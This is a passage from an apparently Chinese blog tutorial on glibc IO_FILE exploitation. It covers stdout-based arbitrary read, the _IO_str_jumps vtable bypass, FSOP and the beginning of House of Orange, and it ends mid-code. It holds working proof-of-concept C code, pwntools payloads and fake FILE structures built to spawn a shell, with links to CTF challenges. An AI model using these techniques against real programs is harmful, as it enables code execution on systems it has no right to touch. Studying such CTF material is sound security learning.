<li>最后 <code>_IO_SYSWRITE</code> 调用
<code>write (f-&gt;_fileno, data, to_do)</code> 输出数据，因此还需构造
<code>_fileno</code> 为标准输出描述符 1 。</li>
</ul>
<p>将上述条件综合描述为： - 设置 <code>_flag</code> &amp;~
<code>_IO_NO_WRITES</code> 即 <code>_flag</code> &amp;~ 0x8。 - 设置
<code>_flag</code> &amp; <code>_IO_CURRENTLY_PUTTING</code> 即
<code>_flag</code> | 0x800 - 设置 <code>_fileno</code> 为1。 - 设置
<code>_IO_write_base</code>
指向想要泄露的地方；<code>_IO_write_ptr</code> 指向泄露结束的地址。 -
设置 <code>_IO_read_end</code> 等于 <code>_IO_write_base</code> 或设置
<code>_flag</code> &amp; <code>_IO_IS_APPENDING</code> 即
<code>_flag</code> | 0x1000。 - 设置 <code>_IO_write_end</code> 等于
<code>_IO_write_ptr</code>（非必须）。</p>
<p>满足上述五个条件，可实现任意读。 举例：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[] = <span class="string">&quot;abcdefghi&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x8</span>;</span><br><span class="line">    fp-&gt;_flags |= <span class="number">0x800</span>;</span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">6</span>];</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</span><br><span class="line">    <span class="built_in">puts</span>(stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>运行结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">123456abcdefghi</span><br></pre></td></tr></table></figure></div>
<h1 id="io_str_jumps">__IO_str_jumps</h1>
<p>libc2.24 在 <code>IO_validate_vtable</code> 函数中对
<code>*vtable</code> 指针进行校验：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *</span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>vtable</code> 必须要满足 在 <code>__stop___IO_vtables</code> 和
<code>__start___libc_IO_vtables</code>
之间，而我们伪造的vtable通常不满足这个条件。 但是
<code>_IO_str_jumps</code> 与 <code>__IO_wstr_jumps</code> 就位于
<code>__stop___libc_IO_vtables</code> 和
<code>__start___libc_IO_vtables</code>
之间，所以我们是可以利用他们来通过 <code>IO_validate_vtable</code>
的检测的,只需要将 <code>*vtable</code> 填成 <code>_IO_str_jumps</code>
或 <code>__IO_wstr_jumps</code> 地址即可。 利用方式主要有针对
<code>__IO_str_jumps</code> 中的 <code>_IO_str_finsh</code> 函数和
<code>_IO_str_overflow</code> 两种。</p>
<h2 id="确定-__io_str_jumps-地址">确定 __IO_str_jumps 地址</h2>
<p>由于 <code>_IO_str_jumps</code>
不是导出符号，<code>libc.sym["_IO_str_jumps"]</code>
查不到，我们可以利用 <code>_IO_str_jumps</code> 中的导出函数例如
<code>_IO_str_underflow</code> 进行辅助定位。首先先得到
<code>_IO_str_underflow</code> 地址，然后查找所有指向该地址的指针。由于
<code>_IO_str_underflow</code> 在 <code>_IO_str_jumps</code> 的偏移为
0x20 ，并且 <code>_IO_str_jumps</code> 的地址大于
<code>_IO_file_jumps</code>
地址，因此可以在选择满足上述条件中最小的地址作为
<code>_IO_str_jumps</code> 的地址。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow = libc.symbols[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">IO_str_underflow_ptr = <span class="built_in">list</span>(libc.search(p64(IO_str_underflow)))</span><br><span class="line">IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + <span class="number">0x20</span>)] - <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(IO_str_jumps)</span><br></pre></td></tr></table></figure></div> ## io_str_finish libc
直到 2.27 版本（有些版本的 2.27 已经修复），<code>_IO_str_finish</code>
都是下面这种实现手段。也就是说，如果修改
<code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为
<code>system</code> 地址，然后修改 <code>fp-&gt;_IO_buf_base</code> 为
<code>/bin/sh</code> 字符串地址，然后触发程序执行
<code>_IO_str_finish</code> 函数就可以得到 shell 。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
具体的攻击流程如下： - 修改 <code>vatble</code> 指针 根据前面 FSOP
的思路，可以通过使程序执行 <code>_IO_flush_all_lockp</code>
函数，进而执行 <code>_IO_overflow</code> 。此时如果将
<code>vatble</code> 指针修改为指向 <code>&amp;_IO_str_jumps - 8</code>
的地址就可以执行 <code>_IO_str_finish</code> 。 - 伪造
<code>_IO_FILE</code> 与 FSOP 基本一致。 - 要满足
<code>fp-&gt;_IO_buf_base</code> 不为空，并且由于它作为
<code>fp-&gt;_s._free_buffer</code> 的第一个参数，因此可以使用
<code>/bin/sh</code> 的地址。 - <code>fp-&gt;_flags</code> 要不包含
<code>_IO_USER_BUF</code>，它的定义为
<code>#define _IO_USER_BUF 1</code>，即 <code>fp-&gt;_flags</code>
最低位为 <code>0</code> 。 - 缓冲区需要有数据，即
<code>_IO_write_base</code> &lt; <code>_IO_write_ptr</code> 。 -
<code>_mode</code> 需要小于等于 0 。 - 修改
<code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为
<code>system</code> 地址，即将 <code>fp+0xE8</code> 除的值改为
<code>system</code> 地址。 - 最后通过 <code>exit</code> 等手段使程序执行
<code>_IO_flush_all_lockp</code> 函数，最终得到 shell 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/862c73e5bc9e2712ddb4c15d5403b61d.png"
                     
alt="在这里插入图片描述" 
                > 下面举一个实际例子：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> i8;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//    i64 *fp = malloc(0x200);</span></span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;./123.txt&quot;</span>, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    i64 libc_base = (i64) &amp;system - <span class="number">0x4F440</span>;</span><br><span class="line">    i64 bin_sh_addr = libc_base + <span class="number">0x1B3E9A</span>;</span><br><span class="line">    i64 IO_str_jump_addr = libc_base + <span class="number">0x3E8360</span>;</span><br><span class="line">    i64 fake_IO_file_jump_addr = IO_str_jump_addr - <span class="number">0x8</span>;</span><br><span class="line">    *(i64 *) fp &amp;= ~<span class="number">1ULL</span>;</span><br><span class="line">    *(i64 *) ((i8 *) fp + <span class="number">0xE8</span>) = (i64) &amp;system;<span class="comment">//((_IO_strfile *) fp)-&gt;_s._free_buffer</span></span><br><span class="line">    *(i64 *) ((i8 *) fp + <span class="number">0xD8</span>) = fake_IO_file_jump_addr;<span class="comment">//*vtable</span></span><br><span class="line">    *((i64 *) fp + <span class="number">24</span>) = <span class="number">0x0</span>;<span class="comment">//_mode</span></span><br><span class="line">    *((i64 *) fp + <span class="number">4</span>) = <span class="number">0x0</span>;<span class="comment">//_IO_write_base</span></span><br><span class="line">    *((i64 *) fp + <span class="number">5</span>) = <span class="number">0x1</span>;<span class="comment">//_IO_write_ptr</span></span><br><span class="line">    *((i64 *) fp + <span class="number">7</span>) = bin_sh_addr;<span class="comment">//_IO_buf_base</span></span><br><span class="line"><span class="comment">//    i64 *list_all_ptr = (i64 *) (libc_base + 0x3ec660);</span></span><br><span class="line"><span class="comment">//    list_all_ptr[0] = (i64) fp;</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>libc 版本为： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 7.3.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div> 运行结果： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/adcefd5908c54681d743bb3400018f61.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h1 id="与堆利用结合">与堆利用结合</h1>
<h2 id="泄露-libc-基址">泄露 libc 基址</h2>
<p>对于没有输出功能的堆题，要想泄露 libc 基址就需要劫持
<code>_IO_2_1_stdout_</code> 结构体。 以这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_24e4e65752923db914c053bc9c26ffc9" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，因为是
libc-2.23 版本，可以利用 fast bin attack 在
<code>_IO_2_1_stdout_-0x43</code> 处申请 fast bin。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/924cc5a0aa1ec3e3756ae5fc3e6a0d31.png"
                     
alt="在这里插入图片描述" 
                > 之后修改 <code>_IO_write_base</code>
指针的最低 1 字节为 <code>\x88</code> 使其指向 <code>_chain</code>
变量，而 <code>_chain</code> 变量中存储了 <code>_IO_2_1_stdin_</code>
结构体地址，程序在下一次输出内容时会先将 write buf
中的内容输出出来，因此可以泄露 libc 基地址。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x33</span> + p32(<span class="number">0xfbad1880</span>) + <span class="string">&quot;;sh;&quot;</span> + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0x88</span>))  <span class="comment"># 5 write_base -&gt; _IO_2_1_stdin_</span></span><br></pre></td></tr></table></figure></div> <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2af6c590bbb50328260ce32e7d38ff5f.png"
                     
alt="在这里插入图片描述" 
                > ## 伪造 vtable 劫持程序流程 同样以前面这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_24e4e65752923db914c053bc9c26ffc9" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，首先利用
fast bin attack 在 <code>_IO_2_1_stdout_+157</code> 地址处申请 0x60
大小的堆块。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/65a0b011d6a6872ad7aab1104bee6698.png"
                     
alt="在这里插入图片描述" 
                > 由于 libc-2.23 版本没有
<code>_IO_vtable_check</code> 检查 <code>vtable</code>
地址，因此可以修改 <code>vtable</code> 指针指向事先在 bss 段伪造的
<code>vtable</code> 。在调用 IO 函数时会将 <code>_IO_2_1_stdout_</code>
结构体指针作为参数传入 <code>vtable</code> 中的函数，因此可以在
<code>_IO_2_1_stdout_</code> 结构体 flag 字段之后的 4 字节填充中写入
<code>;sh;</code> 来获取 shell 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/533cdb6b82f9b1138deb0bb8b155b770.png"
                     
alt="在这里插入图片描述" 
                > ## FSOP FSOP（ File Stream Oriented
Programming ） 的核心思想就是劫持 <code>_IO_list_all</code> 指向伪造的
<code>_IO_FILE_plus</code> 。之后使程序执行
<code>_IO_flush_all_lockp</code> 函数。该函数会刷新
<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用
<code>fflush</code> ，也对应着会调用 <code>_IO_FILE_plus.vtable</code>
中的 <code>_IO_overflow</code> 。</p>
<p>劫持 <code>_IO_list_all</code> 的方式有两种： - 覆盖
<code>_IO_2_1_stderr_</code> 结构体，也就是下面这个例子 - 利用例如 large
bin attack 的攻击方法将 <code>_IO_list_all</code> 覆盖成一个 chunk
地址，然后在该 chunk 上伪造 IO_FILE 结构体。例如后面 House of Pig
就采用了这个方法。</p>
<p>以这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/ciscn_2019_n_7" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，需要通过任意地址写修改
<code>_IO_2_1_stderr</code> 结构体然后 exit 调用
<code>_IO_flush_all_lockp</code> 从而实现 FSOP 。</p>
<p>在劫持 <code>_IO_2_1_stderr</code> 时除了修改 <code>vtable</code>
指针指向伪造 <code>vtable</code> 外，要想调用 <code>_IO_overflow</code>
，还需要修改 <code>_IO_2_1_stderr</code> 以满足以下条件： -
<code>fp-&gt;_mode &lt;= 0</code> -
<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></p>
<p>因此不妨将 vtable 伪造在 <code>_IO_2_1_stderr + 0x10</code> 处使
<code>_IO_2_1_stderr</code> 的 <code>fp-&gt;_IO_write_ptr</code>
恰好对应于 <code>vtable</code> 的 <code>_IO_overflow</code> 。然后将
<code>fp-&gt;_IO_write_ptr</code> 写入 <code>system</code>
函数地址。由于 <code>_IO_overflow</code> 传入的参数为
<code>_IO_2_1_stderr</code> 结构体，因此将结构体其实位置处写入
<code>/bin/sh</code> 字符串。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/239cffc0aedd07f3224149566b2084ce.png"
                     
alt="在这里插入图片描述" 
                > IO_FILE 的伪造对应与代码中可以有如下定义：
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span>  <span class="comment"># _flags, an magic number</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_base</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_base</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_base;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span>  <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])  <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">2</span>)  <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>)  <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span>  <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span>  <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>)  <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>)  <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span>  <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>)  <span class="comment"># _mode, usually -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span>  <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0x10</span>)  <span class="comment"># fake vtable</span></span><br></pre></td></tr></table></figure></div> ## House of Orange house of orange
利用手法有两部分，前半部分是无 free 的情况下得到位于 unsorted bin 的
chunk ，后半部分是利用 unsorted bin attack 劫持
<code>_IO_list_all</code> 实现 FSOP 。</p>
<p>首先是第一部分。如果当前堆的 top chunk
尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入
unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted
bins。</p>
<p>但是执行 sysmalloc 来向系统申请内存有 mmap 和 brk
两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk
会被置于 unsorted bin 中。这需要 malloc
的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure></div>
<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为
128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用
mmap() 系统调用直接向操作系统申请内存。</p>
<p>在 sysmalloc 函数中存在对 top chunk size 的 check 如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = <span class="built_in">chunksize</span>(old_top);</span><br><span class="line">old_end = (<span class="type">char</span> *) (<span class="built_in">chunk_at_offset</span>(old_top, old_size));</span><br><span class="line">...</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">assert</span>((old_top == <span class="built_in">initial_top</span>(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">       ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">        <span class="built_in">prev_inuse</span>(old_top) &amp;&amp;</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line"><span class="built_in">assert</span>((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>伪造的 top chunk 的结束位置必须要对齐到内存页(4k)</p></li>
<li><p>size 要大于 MINSIZE(0x10)</p></li>
<li><p>size 要小于之后申请的 chunk size + MINSIZE(0x10)</p></li>
<li><p>size 的 prev inuse 位必须为 1</p></li>
</ul>
<p>通过上述检查后会进行 brk 系统调用来扩展 heap 段。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">size = nb + mp_.top_pad + MINSIZE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If contiguous, we can subtract out existing space that we hope to</span></span><br><span class="line"><span class="comment">   combine with new space. We add it back later only if</span></span><br><span class="line"><span class="comment">   we don&#x27;t actually get contiguous space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (contiguous (av))</span><br><span class="line">  size -= old_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Round to a multiple of page size.</span></span><br><span class="line"><span class="comment">   If MORECORE is not contiguous, this ensures that we only call it</span></span><br><span class="line"><span class="comment">   with whole-page arguments.  And if MORECORE is contiguous and</span></span><br><span class="line"><span class="comment">   this is not first time through, this preserves page-alignment of</span></span><br><span class="line"><span class="comment">   previous calls. Otherwise, we correct to page-align below.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Don&#x27;t try to call MORECORE if argument is so big as to appear</span></span><br><span class="line"><span class="comment">   negative. Note that since mmap takes size_t arg, it may succeed</span></span><br><span class="line"><span class="comment">   below even if we cannot call MORECORE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    brk = (<span class="type">char</span> *) (MORECORE (size));</span><br><span class="line">    LIBC_PROBE (memory_sbrk_more, <span class="number">2</span>, brk, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (brk != (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">    <span class="type">void</span> (*hook) (<span class="type">void</span>) = atomic_forced_read (__after_morecore_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">      (*hook)();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
此时堆的状态如下：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/58f74b778e8fa04af4ca279b2a02a1d6.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
如果是正常通过 brk 系统调用扩展 heap 区域，最终程序将直接增大 top chunk
的 size，但是由于之前已经将 top chunk 的 size 改小了，通不过下面的 if
判断。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">  set_head (old_top, (size + old_size) | PREV_INUSE);</span><br></pre></td></tr></table></figure></div>
<p>并且会通过接下来的检查：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span></span><br><span class="line">    malloc_printerr (<span class="number">3</span>, <span class="string">&quot;break adjusted to free malloc space&quot;</span>, brk,</span><br><span class="line">av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>此时 ptmalloc 认为 heap 段已经不连续，ptmalloc 会为新的 heap 段的 top
chunk 通过 brk 扩展 heap 区域，然后释放掉原先的 top chunk 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">           Otherwise, make adjustments:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * If the first time through or noncontiguous, we need to call sbrk</span></span><br><span class="line"><span class="comment">            just to find out where the end of memory lies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * We need to ensure that all returned chunks from malloc will meet</span></span><br><span class="line"><span class="comment">            MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * If there was an intervening foreign sbrk, we need to adjust sbrk</span></span><br><span class="line"><span class="comment">            request size to account for fact that we will not be able to</span></span><br><span class="line"><span class="comment">            combine new space with existing space in old_top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * Almost all systems internally allocate whole pages at a time, in</span></span><br><span class="line"><span class="comment">            which case we might as well use the whole last page of request.</span></span><br><span class="line"><span class="comment">            So we allocate enough more memory to hit a page boundary now,</span></span><br><span class="line"><span class="comment">            which in turn causes future contiguous calls to page-align.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    front_misalign = <span class="number">0</span>;</span><br><span class="line">    end_misalign = <span class="number">0</span>;</span><br><span class="line">    correction = <span class="number">0</span>;</span><br><span class="line">    aligned_brk = brk;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handle contiguous cases */</span></span><br><span class="line">    <span class="keyword">if</span> (contiguous(av)) &#123;</span><br><span class="line">        <span class="comment">/* Count foreign sbrk as system_mem.  */</span></span><br><span class="line">        <span class="keyword">if</span> (old_size)</span><br><span class="line">            av-&gt;system_mem += brk - old_end;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Guarantee alignment of first new chunk made from this space */</span></span><br><span class="line"></span><br><span class="line">        front_misalign = (INTERNAL_SIZE_T) chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">        <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            